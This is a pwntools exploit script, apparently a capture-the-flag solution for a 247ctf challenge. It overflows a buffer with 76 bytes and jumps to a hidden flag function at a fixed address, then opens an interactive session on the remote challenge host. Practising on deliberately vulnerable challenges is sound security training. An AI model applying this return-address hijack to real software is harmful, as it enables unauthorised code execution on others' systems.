#!/usr/bin/env python3

# Exploit by x90slide

from pwn import *

elf = ELF("./hidden_flag_function_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("8a01e5f61d367d19.247ctf.com", 50067)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    winfun = 0x08048576
    payload = flat(b'A'*76, winfun)
    io.sendlineafter(b'?', payload)

    io.interactive()

if __name__ == "__main__":
    main()
